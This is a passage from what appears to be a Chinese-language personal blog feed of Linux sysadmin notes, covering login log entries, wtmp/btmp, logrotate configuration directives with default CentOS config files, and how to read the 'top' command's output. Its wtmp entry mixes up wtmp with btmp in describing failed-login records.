<span class="hljs-number">19</span>:<span class="hljs-number">10</span>:<span class="hljs-number">01</span> iZbp1191gh7vw52537lyxrZ systemd: Started Session <span class="hljs-number">44</span> of user root.<br></code></pre></td></tr></table></figure><h2 id="常见动作的日志"><a href="#常见动作的日志" class="headerlink" title="常见动作的日志"></a>常见动作的日志</h2><h3 id="终端登录"><a href="#终端登录" class="headerlink" title="终端登录"></a>终端登录</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Apr</span>  <span class="hljs-number">1</span> <span class="hljs-number">19</span>:<span class="hljs-number">13</span>:<span class="hljs-number">44</span> iZbp1191gh7vw52537lyxrZ systemd: Started Session <span class="hljs-number">45</span> of user root.<br><span class="hljs-attribute">Apr</span>  <span class="hljs-number">1</span> <span class="hljs-number">19</span>:<span class="hljs-number">13</span>:<span class="hljs-number">44</span> iZbp1191gh7vw52537lyxrZ systemd-logind: New session <span class="hljs-number">45</span> of user root.<br></code></pre></td></tr></table></figure><h3 id="终端退出"><a href="#终端退出" class="headerlink" title="终端退出"></a>终端退出</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Apr</span>  <span class="hljs-number">1</span> <span class="hljs-number">19</span>:<span class="hljs-number">14</span>:<span class="hljs-number">18</span> iZbp1191gh7vw52537lyxrZ systemd-logind: Removed session <span class="hljs-number">45</span>.<br></code></pre></td></tr></table></figure><h2 id="待研究问题"><a href="#待研究问题" class="headerlink" title="待研究问题"></a>待研究问题</h2>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>log</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>log</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log_wtmp</title>
    <link href="/2024/04/01/yunwei/log/log_wtmp/"/>
    <url>/2024/04/01/yunwei/log/log_wtmp/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#x2F;var&#x2F;log&#x2F;wtmp 主要是系统记录所有登录失败信息</p><h2 id="适配系统"><a href="#适配系统" class="headerlink" title="适配系统"></a>适配系统</h2><p>CentOS、Ubuntu等系统</p><h2 id="日志设置"><a href="#日志设置" class="headerlink" title="日志设置"></a>日志设置</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><h3 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h3><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>二进制文件</p><h3 id="文件权限-600"><a href="#文件权限-600" class="headerlink" title="文件权限 600"></a>文件权限 600</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ <span class="hljs-keyword">log</span>]# <span class="hljs-keyword">ls</span> -lat /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp<br>-rw------- 1 root utmp 52224 8月  25 04:36 /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp<br></code></pre></td></tr></table></figure><h2 id="日志作用"><a href="#日志作用" class="headerlink" title="日志作用"></a>日志作用</h2><p>lastb 命令默认数据来源，也就是说默认通过 lastb 查看数据</p><p>常用于判断是否存在SSH暴力破解</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>log</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>log</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log_set</title>
    <link href="/2024/04/01/yunwei/log/log_set/"/>
    <url>/2024/04/01/yunwei/log/log_set/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>日志作为系统中很重要的一部分，对日志配置的研究有助于进一步了解日志</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h3><h4 id="设置日志文件大小"><a href="#设置日志文件大小" class="headerlink" title="设置日志文件大小"></a>设置日志文件大小</h4><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p>&#x2F;etc&#x2F;logrogtate.conf</p><p>&#x2F;etc&#x2F;logrotate.d&#x2F;</p><h5 id="日志配置字段说明"><a href="#日志配置字段说明" class="headerlink" title="日志配置字段说明"></a>日志配置字段说明</h5><h6 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h6><p>独立设置的日志格式配置优先于通用格式配置</p><p>例如：&#x2F;etc&#x2F;logrotate.d&#x2F;里的会优先于&#x2F;etc&#x2F;logrogtate.conf里的配置</p><p>&#x2F;etc&#x2F;logrogtate.conf 里的独立配置也会优先于通用配置，wtmp 和 btmp日志会按照独立的配置执行，例如按月转储，只保留1个</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stata">weekly<br><span class="hljs-keyword">rotate</span> 4<br>create<br>dateext<br><span class="hljs-keyword">include</span> /etc/logrotate.<span class="hljs-keyword">d</span><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp &#123;<br>    monthly<br>    create 0664 root utmp<br>minsize 1M<br>    <span class="hljs-keyword">rotate</span> 1<br>&#125;<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp &#123;<br>    missingok<br>    monthly<br>    create 0600 root utmp<br>    <span class="hljs-keyword">rotate</span> 1<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="weekly"><a href="#weekly" class="headerlink" title="weekly"></a>weekly</h6><p>每周转储一次，也就是每周生成一个日志文件</p><h6 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h6><p>每天转储一次，也就是每天生成一个日志文件</p><h6 id="monthly"><a href="#monthly" class="headerlink" title="monthly"></a>monthly</h6><p>每月转储一次，也就是每月生成一个日志文件</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@aliyun-1_1_1_1 log]<span class="hljs-comment"># ls /var/log/secure* -lat</span><br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 21008467 </span>4月  <span class="hljs-number"> 1 </span>16:02 /var/log/secure<br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 96609789 </span>3月 <span class="hljs-number"> 31 </span>03:20 /var/log/secure-20240331<br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 98212385 </span>3月 <span class="hljs-number"> 24 </span>03:21 /var/log/secure-20240324<br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 98575554 </span>3月 <span class="hljs-number"> 17 </span>03:13 /var/log/secure-20240317<br>-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 100238540 </span>3月 <span class="hljs-number"> 10 </span>03:38 /var/log/secure-20240310<br></code></pre></td></tr></table></figure><h6 id="rotate-num"><a href="#rotate-num" class="headerlink" title="rotate  num"></a>rotate  num</h6><p>保存num个备份文件</p><p>&#x2F;var&#x2F;log&#x2F;secure-20240331 &#x2F;var&#x2F;log&#x2F;secure-20240324 &#x2F;var&#x2F;log&#x2F;secure-20240317 &#x2F;var&#x2F;log&#x2F;secure-20240310</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@aliyun-1_1_1_1 log]<span class="hljs-comment"># ls /var/log/secure* -lat</span><br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 21008467 </span>4月  <span class="hljs-number"> 1 </span>16:02 /var/log/secure<br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 96609789 </span>3月 <span class="hljs-number"> 31 </span>03:20 /var/log/secure-20240331<br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 98212385 </span>3月 <span class="hljs-number"> 24 </span>03:21 /var/log/secure-20240324<br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 98575554 </span>3月 <span class="hljs-number"> 17 </span>03:13 /var/log/secure-20240317<br>-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 100238540 </span>3月 <span class="hljs-number"> 10 </span>03:38 /var/log/secure-20240310<br></code></pre></td></tr></table></figure><h6 id="dateext"><a href="#dateext" class="headerlink" title="dateext"></a>dateext</h6><p>在转储后的文件名中增加日期</p><p>secure-20240331</p><h6 id="dateformat-Y-m-d"><a href="#dateformat-Y-m-d" class="headerlink" title="dateformat .%Y-%m-%d"></a>dateformat .%Y-%m-%d</h6><p>自定义转储后增加的日期格式</p><h6 id="dateyesterday"><a href="#dateyesterday" class="headerlink" title="dateyesterday"></a>dateyesterday</h6><p>设置新增加的日期均为昨天</p><p>例如：2024年4月1日转储的文件，文件中的日期将为2024-03-30，而不是2024.04.01</p><h6 id="missingok"><a href="#missingok" class="headerlink" title="missingok"></a>missingok</h6><p>如果日志文件丢失，则忽略并继续转储</p><h6 id="create-0644-root-root"><a href="#create-0644-root-root" class="headerlink" title="create 0644 root root"></a>create 0644 root root</h6><p>创建新的转储后的日志文件权限</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/btmp &#123;<br>    missingok<br>    monthly<br>    create <span class="hljs-number">0600</span> root utmp<br>    <span class="hljs-built_in">rotate</span> <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@aliyun-1_1_1_1 log]<span class="hljs-comment"># ls -lat btmp*</span><br>-rw-------<span class="hljs-number"> 1 </span>root utmp   <span class="hljs-number"> 1536 </span>4月  <span class="hljs-number"> 1 </span>15:16 btmp<br>-rw-------<span class="hljs-number"> 1 </span>root utmp<span class="hljs-number"> 1031808 </span>4月  <span class="hljs-number"> 1 </span>01:40 btmp-20240401<br></code></pre></td></tr></table></figure><p>create 0600 root utmp 表示 utmp 日志文件的权限为 6(r+w)00，用户为root，属组信息为 utmp</p><h6 id="minsize-xxM"><a href="#minsize-xxM" class="headerlink" title="minsize xxM"></a>minsize xxM</h6><p>日志文件必需达到指定大小才执行转储策略</p><p>当日志文件大小小于指定的值时，不会进行转储</p><p>到日志文件大小达到或超过指定的值时，将按照其他的转储条件执行操作（如size、rotate）</p><p>通常用于避免对过小的日志文件进行转储，因为转储过程可能会导致数据丢失或不必要的系统开销</p><h6 id="size-xxM"><a href="#size-xxM" class="headerlink" title="size xxM"></a>size xxM</h6><p>日志文件达到指定文件大小才执行转储策略</p><p>当日志大小达到或超过指定的大小时，将触发转储操作</p><p>当日志大小没有达到指定的大小时，将不会触发转储操作</p><h6 id="notifempty"><a href="#notifempty" class="headerlink" title="notifempty"></a>notifempty</h6><p>如果日志文件为空，则不转储</p><h6 id="compress"><a href="#compress" class="headerlink" title="compress"></a>compress</h6><p>压缩转储之后的日志文件</p><h6 id="sharedscripts"><a href="#sharedscripts" class="headerlink" title="sharedscripts"></a>sharedscripts</h6><p>每次转储文件时是否应该执行一次脚本</p><p>设置为TRUE时，会在所有相关文件转储后执行一次脚本，会在access.log和error.log都转储完成后，执行一次脚本</p><p>设置为FALSE时，会在每个日志文件转储后执行脚本，会在access.log转储完执行一次，在error.log转储完执行一次</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">(base) [root@aliyun<span class="hljs-number">-1</span>_1_1_1 nginx]# <span class="hljs-keyword">ls</span><br>access.<span class="hljs-keyword">log</span>  <span class="hljs-keyword">error</span>.<span class="hljs-keyword">log</span>  <span class="hljs-keyword">error</span>.<span class="hljs-keyword">log</span><span class="hljs-number">-20230810</span><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>*.log &#123;<br>    create <span class="hljs-number">0640</span> nginx root<br>    daily<br>    rotate <span class="hljs-number">10</span><br>    missingok<br>    notifempty<br>    compress<br>    delaycompress<br>    sharedscripts<br>    postrotate<br>        <span class="hljs-regexp">/bin/</span>kill -USR1 `cat <span class="hljs-regexp">/run/</span>nginx.pid <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>` <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> || <span class="hljs-keyword">true</span><br>    endscript<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="postrotate"><a href="#postrotate" class="headerlink" title="postrotate"></a>postrotate</h6><p>执行的脚本</p><h6 id="endscript"><a href="#endscript" class="headerlink" title="endscript"></a>endscript</h6><p>标记前面定义的 prerotate 或 postrotate 段落的结束</p><h4 id="默认配置"><a href="#默认配置" class="headerlink" title="默认配置"></a>默认配置</h4><h5 id="logrotate-conf"><a href="#logrotate-conf" class="headerlink" title="logrotate.conf"></a>logrotate.conf</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stata">weekly<br><span class="hljs-keyword">rotate</span> 4<br>create<br>dateext<br><span class="hljs-keyword">include</span> /etc/logrotate.<span class="hljs-keyword">d</span><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp &#123;<br>    monthly<br>    create 0664 root utmp<br>minsize 1M<br>    <span class="hljs-keyword">rotate</span> 1<br>&#125;<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp &#123;<br>    missingok<br>    monthly<br>    create 0600 root utmp<br>    <span class="hljs-keyword">rotate</span> 1<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="logrotate-d-bootlog"><a href="#logrotate-d-bootlog" class="headerlink" title="logrotate.d&#x2F;bootlog"></a>logrotate.d&#x2F;bootlog</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata">/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/<span class="hljs-keyword">boot</span>.<span class="hljs-keyword">log</span><br>&#123;<br>    missingok<br>    daily<br>    copytruncate<br>    <span class="hljs-keyword">rotate</span> 7<br>    notifempty<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="logrotate-d-chrony"><a href="#logrotate-d-chrony" class="headerlink" title="logrotate.d&#x2F;chrony"></a>logrotate.d&#x2F;chrony</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/chrony/</span>*.log &#123;<br>    missingok<br>    nocreate<br>    sharedscripts<br>    postrotate<br>        <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/chronyc cyclelogs &gt; /</span>dev/<span class="hljs-keyword">null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> || <span class="hljs-keyword">true</span><br>    endscript<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="logrotate-d-firewalld"><a href="#logrotate-d-firewalld" class="headerlink" title="logrotate.d&#x2F;firewalld"></a>logrotate.d&#x2F;firewalld</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/firewalld &#123;<br>    weekly<br>    missingok<br>    <span class="hljs-built_in">rotate</span> <span class="hljs-number">4</span><br>    copytruncate<br>    minsize <span class="hljs-number">1</span>M<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="logrotate-d-firewalld-1"><a href="#logrotate-d-firewalld-1" class="headerlink" title="logrotate.d&#x2F;firewalld"></a>logrotate.d&#x2F;firewalld</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/cron<br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/maillog<br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/messages<br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/secure<br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/spooler<br>&#123;<br>    missingok<br>    sharedscripts<br>    postrotate<br>/bin/kill -HUP <span class="hljs-string">`cat /var/run/syslogd.pid 2&gt; /dev/null`</span> <span class="hljs-number">2</span>&gt; <span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> || <span class="hljs-literal">true</span><br>    endscript<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="logrotate-d-wpa-supplicant"><a href="#logrotate-d-wpa-supplicant" class="headerlink" title="logrotate.d&#x2F;wpa_supplicant"></a>logrotate.d&#x2F;wpa_supplicant</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/wpa_supplicant.<span class="hljs-built_in">log</span> &#123;<br>    missingok<br>    notifempty<br>    size <span class="hljs-number">30</span>k<br>    create <span class="hljs-number">0600</span> root root<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="logrotate-d-yum"><a href="#logrotate-d-yum" class="headerlink" title="logrotate.d&#x2F;yum"></a>logrotate.d&#x2F;yum</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/yum.<span class="hljs-built_in">log</span> &#123;<br>    missingok<br>    notifempty<br>    maxsize <span class="hljs-number">30</span>k<br>    yearly<br>    create <span class="hljs-number">0600</span> root root<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>log</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>log</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>top</title>
    <link href="/2024/04/01/yunwei/commands/top/"/>
    <url>/2024/04/01/yunwei/commands/top/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>默认自带该命令</p><p>用于实时动态的查看系统的整体运行情况</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>top(选项)</p><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><p>-b : 以批处理模式操作</p><p>-c : 显示完整的命令</p><p>-d : 屏幕刷新间隔时间   -d ss.tt (seconds.tenths)</p><p>-I ：忽略失效过程</p><p>-s ：累积模式</p><p>-i&lt;时间&gt;  : 设置间隔时间</p><p>-u&lt;用户名&gt;：指定用户名</p><p>-p&lt;进程号&gt;：指定进程</p><p>-n&lt;次数&gt;：循环显示的次数</p><p>-o [+&#x2F;-]fieldname1 ：指定排序字段，+表示降序，-表示升序</p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@VM_160_165_centos</span> ~]# top<br>top - <span class="hljs-number">20</span>:<span class="hljs-number">39</span>:<span class="hljs-number">29</span> up <span class="hljs-number">4</span> days<span class="hljs-punctuation">,</span> <span class="hljs-number">28</span> <span class="hljs-keyword">min</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">2</span> users<span class="hljs-punctuation">,</span>  <span class="hljs-keyword">load</span> average: <span class="hljs-number">0.00</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.00</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.00</span><br>Tasks: <span class="hljs-number">110</span> total<span class="hljs-punctuation">,</span>   <span class="hljs-number">1</span> running<span class="hljs-punctuation">,</span> <span class="hljs-number">109</span> sleeping<span class="hljs-punctuation">,</span>   <span class="hljs-number">0</span> stopped<span class="hljs-punctuation">,</span>   <span class="hljs-number">0</span> zombie<br>Cpu(s):  <span class="hljs-number">0.2</span><span class="hljs-variable">%us</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.2</span><span class="hljs-variable">%sy</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.0</span><span class="hljs-variable">%ni</span><span class="hljs-punctuation">,</span> <span class="hljs-number">99.0</span><span class="hljs-variable">%id</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.7</span><span class="hljs-variable">%wa</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.0</span><span class="hljs-variable">%hi</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.0</span><span class="hljs-variable">%si</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.0</span><span class="hljs-variable">%st</span><br>Mem:   <span class="hljs-number">3922456</span>k total<span class="hljs-punctuation">,</span>  <span class="hljs-number">1292332</span>k used<span class="hljs-punctuation">,</span>  <span class="hljs-number">2630124</span>k <span class="hljs-keyword">free</span><span class="hljs-punctuation">,</span>   <span class="hljs-number">667296</span>k buffers<br>Swap:        <span class="hljs-number">0</span>k total<span class="hljs-punctuation">,</span>        <span class="hljs-number">0</span>k used<span class="hljs-punctuation">,</span>        <span class="hljs-number">0</span>k <span class="hljs-keyword">free</span><span class="hljs-punctuation">,</span>   <span class="hljs-number">427100</span>k cached<br><br>  PID USER      PR  NI  VIRT  RES  SHR S <span class="hljs-variable">%CPU</span> <span class="hljs-variable">%MEM</span>    TIME+  COMMAND                                                                          <br><span class="hljs-number">25723</span> root      <span class="hljs-number">20</span>   <span class="hljs-number">0</span> <span class="hljs-number">62160</span> <span class="hljs-number">9472</span> <span class="hljs-number">2108</span> S  <span class="hljs-number">0.3</span>  <span class="hljs-number">0.2</span>   <span class="hljs-number">0</span>:<span class="hljs-number">01.02</span> barad_agent                                                                       <br><span class="hljs-number">25724</span> root      <span class="hljs-number">20</span>   <span class="hljs-number">0</span>  <span class="hljs-number">434</span>m  <span class="hljs-number">12</span>m <span class="hljs-number">2240</span> S  <span class="hljs-number">0.3</span>  <span class="hljs-number">0.3</span>   <span class="hljs-number">0</span>:<span class="hljs-number">05.51</span> barad_agent  <br></code></pre></td></tr></table></figure><p>说明：</p><p>top - 20:39:29当前系统时间</p><p>up 4 days, 28 min系统运行时间</p><p>2 users当前登录用户</p><p>load average: 0.00, 0.00, 0.00系统负载，任务队列的平均长度</p><p>Tasks: 110 total总进程数</p><p>1 running正在运行的进程数</p><p>109 sleeping睡眠的进程数</p><p> 0 stopped停止的进程数</p><p>0 zombie冻结的进程数</p><p>Cpu(s):  0.2%us用户空间占用 CPU 百分比</p><p>0.2%sy内核空间占用 CPU 百分比</p><p>0.0%ni用户进程空间内改变过优先级的进程占用CPU百分比</p><p>99.0%id空闲 CPU 百分比</p><p>0.7%wa等待输入输出的 CPU 时间百分比</p><p>0.0%si</p><p>0.0%st</p><p>Mem:   3922456k total物理内存总量</p><p>1292332k used使用的物理内存总量</p><p>2630124k free空闲内存总量</p><p>667296k buffers用作内核缓存的内存量</p><p>Swap:        0k total交换区内存总量</p><p>0k used使用的交换区总量</p><p>0k free空闲交换区总量</p><p>427100k cached缓冲的交换区总量</p><p>VIRT</p><p>virtual memory usage 虚拟内存</p><p>进程需要的虚拟内存大小</p><p>如果进程申请 100M 内存，实际只使用 10 M ，值会增长 100M</p><p>RES</p><p>resident memory usage 常驻内存</p><p>进程当前使用的内存大小，不包括 swap out</p><p>包含其他进程的共享</p><p>只统计加载的库文件所占内存大小</p><p>如果进程申请 100M 内存，实际只使用 10M ，值只会增长 10M，与 VIRT 相反</p><p>SHR</p><p>shared memory 共享内存</p><p>除了自身进程的共享内存，也包括其他进程的共享内存</p><p>虽然进程只使用几个共享库的函数，但是包含了整个共享库的大小</p><p>某个进程所占物理内存大小： RES - SHR</p><p>swap out 后，值会下降</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="查看每个-CPU-的使用情况"><a href="#查看每个-CPU-的使用情况" class="headerlink" title="查看每个 CPU 的使用情况"></a>查看每个 CPU 的使用情况</h3><p>top 命令之后按  1  ,会显示每个 CPU 的使用情况，如果不操作，显示的是 CPU 的平均状态</p><p><img src="/2024/04/01/yunwei/commands/top/clipboard-16377255556361.png" alt="img"></p><p>load average: 237.05, 235.56, 231.97</p><p>这个值是 CPU 内存 硬盘 综合的负载</p><h3 id="查看指定进程的完整命令"><a href="#查看指定进程的完整命令" class="headerlink" title="查看指定进程的完整命令"></a>查看指定进程的完整命令</h3><p>top -c -p 1097</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/home/ubuntu<span class="hljs-comment"># top -c -p 1097</span><br>top - 16:36:12 up<span class="hljs-number"> 1 </span>day, 17:56, <span class="hljs-number"> 2 </span>users,  load average: 0.00, 0.00, 0.00<br>Tasks:  <span class="hljs-number"> 1 </span>total,  <span class="hljs-number"> 0 </span>running,  <span class="hljs-number"> 1 </span>sleeping,  <span class="hljs-number"> 0 </span>stopped,  <span class="hljs-number"> 0 </span>zombie<br>%Cpu(s):  0.7 us,  0.2 sy,  0.0 ni, 99.2 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st<br>MiB Mem :   3935.6 total,   2508.0 free,    309.4 used,   1118.1 buff/cache<br>MiB Swap:      0.0 total,      0.0 free,      0.0 used.   3385.2 avail Mem<br><br>    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND<br>  <span class="hljs-number"> 1097 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span><span class="hljs-number"> 874176 </span><span class="hljs-number"> 89136 </span><span class="hljs-number"> 49940 </span>S   0.0   2.2   0:21.24 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock<br></code></pre></td></tr></table></figure><h3 id="3、查看CPU占用"><a href="#3、查看CPU占用" class="headerlink" title="3、查看CPU占用"></a>3、查看CPU占用</h3><p><strong>top -c -o 